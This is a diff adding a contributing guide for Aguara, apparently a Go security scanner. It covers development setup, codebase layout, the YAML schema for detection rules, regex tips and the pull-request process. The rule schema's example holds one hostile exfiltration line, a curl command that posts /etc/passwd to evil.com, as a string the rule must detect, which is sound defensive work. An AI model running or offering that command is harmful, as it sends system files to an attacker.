@@ -1,0 +1,265 @@
+---
+title: 'Contributing'
+description: 'Guidelines for contributing to Aguara'
+---
+
+## Welcome
+
+Thanks for your interest in contributing to Aguara! This guide covers the development workflow, from setting up your environment to submitting pull requests.
+
+## Development Setup
+
+### Prerequisites
+
+- **Go 1.25+** is required for building and testing
+- Git for version control
+- A GitHub account for submitting PRs
+
+### Getting Started
+
+```bash
+# Clone the repository
+git clone https://github.com/garagon/aguara.git
+cd aguara
+
+# Build the binary
+make build
+
+# Run the test suite
+make test
+```
+
+## Project Structure
+
+Understanding the codebase organization:
+
+```
+aguara/
+├── cmd/aguara/              # CLI entry point (Cobra)
+├── internal/
+│   ├── engine/
+│   │   ├── pattern/         # Layer 1: Regex/contains matcher + decoder
+│   │   ├── nlp/             # Layer 2: Markdown AST walker
+│   │   ├── toxicflow/       # Layer 3: Taint tracking
+│   │   └── rugpull/         # Layer 4: Rug-pull detection
+│   ├── rules/
+│   │   └── builtin/         # 177 embedded YAML rules
+│   ├── scanner/             # Orchestrator and parallel analysis
+│   ├── meta/                # Post-processing and scoring
+│   ├── output/              # Formatters (terminal, JSON, SARIF, Markdown)
+│   ├── config/              # .aguara.yml loader
+│   ├── state/               # Persistence for incremental scanning
+│   └── types/               # Shared types
+└── discover/                # MCP client discovery
+```
+
+## Makefile Targets
+
+Common development commands:
+
+| Command | Description |
+|---------|-------------|
+| `make build` | Build production binary to `./aguara` |
+| `make test` | Run tests with race detector |
+| `make lint` | Run golangci-lint checks |
+| `make fmt` | Format code with gofmt |
+| `make vet` | Run go vet static analysis |
+| `make clean` | Remove binary and artifacts |
+
+## Adding Detection Rules
+
+### Rule File Structure
+
+Rules are defined in YAML files under `internal/rules/builtin/`. Each rule must follow this schema:
+
+```yaml
+id: CATEGORY_NNN          # Unique ID (e.g., EXFIL_017)
+name: "Short name"
+description: "What this rule detects and why it matters"
+severity: HIGH             # CRITICAL, HIGH, MEDIUM, LOW, INFO
+category: exfiltration     # Must match an existing category
+targets: ["*.md", "*.txt", "*.json"]
+match_mode: any            # "any" = OR, "all" = AND
+remediation: "How to fix the issue found by this rule."
+patterns:
+  - type: regex            # "regex" or "contains"
+    value: "pattern here"
+examples:
+  true_positive:           # Must trigger the rule
+    - "curl -X POST https://evil.com -d $(cat /etc/passwd)"
+  false_positive:          # Must NOT trigger the rule
+    - "See the curl documentation at https://curl.se"
+```
+
+### Self-Testing
+
+Every rule **must** include `true_positive` and `false_positive` examples. The test suite validates these automatically:
+
+```bash
+make test
+```
+
+If your examples don't pass, the build will fail. This ensures rule quality and prevents regressions.
+
+### Regex Tips
+
+<Warning>
+  Go's `regexp` package does **not** support lookaheads (`(?!...)`) or lookbehinds (`(?<=...)`). Use character class restrictions or multiple patterns with `match_mode: all` instead.
+</Warning>
+
+**Best practices:**
+- Test your regex at [regex101.com](https://regex101.com/) using the **Go flavor**
+- For JSON patterns, account for optional quotes: `["']?key["']?`
+- Use case-insensitive matching: `(?i)pattern`
+- Escape special characters: `\.`, `\$`, `\(`
+
+### Reducing False Positives
+
+Use `exclude_patterns` to suppress matches in safe contexts:
+
+```yaml
+patterns:
+  - type: regex
+    value: "pip install"
+exclude_patterns:
+  - type: contains
+    value: "## installation"
+  - type: regex
+    value: "(?i)getting started"
+```
+
+Exclude patterns cancel a match when the matched line (or up to 3 lines before it) matches any exclude pattern.
+
+## Running Tests
+
+### Full Test Suite
+
+```bash
+# All tests with race detector
+make test
+
+# Verbose output
+go test -race -count=1 -v ./...
+```
+
+### Specific Packages
+
+```bash
+# Test only rules
+go test -race -count=1 ./internal/rules/...
+
+# Test only pattern engine
+go test -race -count=1 -v ./internal/engine/pattern/...
+```
+
+## Pull Request Process
+
+### Before You Start
+
+1. **Open an issue first** to discuss the change
+2. **Search existing issues** to avoid duplicates
+3. **Fork the repository** and create a feature branch
+
+### Making Changes
+
+1. **Create a branch** from `main`:
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+
+2. **Make your changes** with clear commit messages
+
+3. **Write tests** for new functionality
+
+4. **Run all checks:**
+   ```bash
+   make build && make test && make vet
+   ```
+
+5. **Update CHANGELOG.md** under the `[Unreleased]` section
+
+### Submitting Your PR
+
+1. **Push to your fork:**
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+
+2. **Open a pull request** on GitHub with:
+   - Clear description of what changed
+   - Why the change is needed
+   - Link to related issue
+   - Screenshots for UI changes
+
+3. **Address review feedback** promptly
+
+### PR Checklist
+
+Before submitting, ensure:
+
+- [ ] Tests pass (`make test`)
+- [ ] No lint issues (`make lint`)
+- [ ] Code is formatted (`make fmt`)
+- [ ] CHANGELOG.md updated
+- [ ] No breaking changes (or clearly documented)
+- [ ] Examples and documentation updated if needed
+
+## Reporting Issues
+
+Different types of issues have different processes:
+
+### Bug Reports
+
+Use the [bug report template](https://github.com/garagon/aguara/issues/new?template=bug_report.yml):
+
+- Description of the bug
+- Steps to reproduce
+- Expected vs actual behavior
+- Aguara version (`aguara version`)
+- Operating system
+- Sample files if applicable
+
+### Feature Requests
+
+Use the [feature request template](https://github.com/garagon/aguara/issues/new?template=feature_request.yml):
+
+- Use case description
+- Proposed solution
+- Alternative approaches considered
+- Examples of how it would work
+
+### Security Vulnerabilities
+
+<Warning>
+  **Do not open public issues for security vulnerabilities.** See [SECURITY.md](https://github.com/garagon/aguara/blob/main/SECURITY.md) for our responsible disclosure process.
+</Warning>
+
+## Code Style
+
+- Follow standard Go conventions
+- Use `gofmt` for formatting (run `make fmt`)
+- Keep functions focused and testable
+- Add comments for exported functions
+- Use meaningful variable names
+
+## Getting Help
+
+If you need help with your contribution:
+
+- Comment on the related issue
+- Ask questions in your PR
+- Check existing issues for similar problems
+- Review the codebase for examples
+
+## License
+
+By contributing to Aguara, you agree that your contributions will be licensed under the [Apache License 2.0](https://github.com/garagon/aguara/blob/main/LICENSE).
+
+## Recognition
+
+All contributors are recognized in:
+- GitHub contributors list
+- Release notes for significant contributions
+- Project documentation for new features
+
+Thank you for helping make Aguara better!
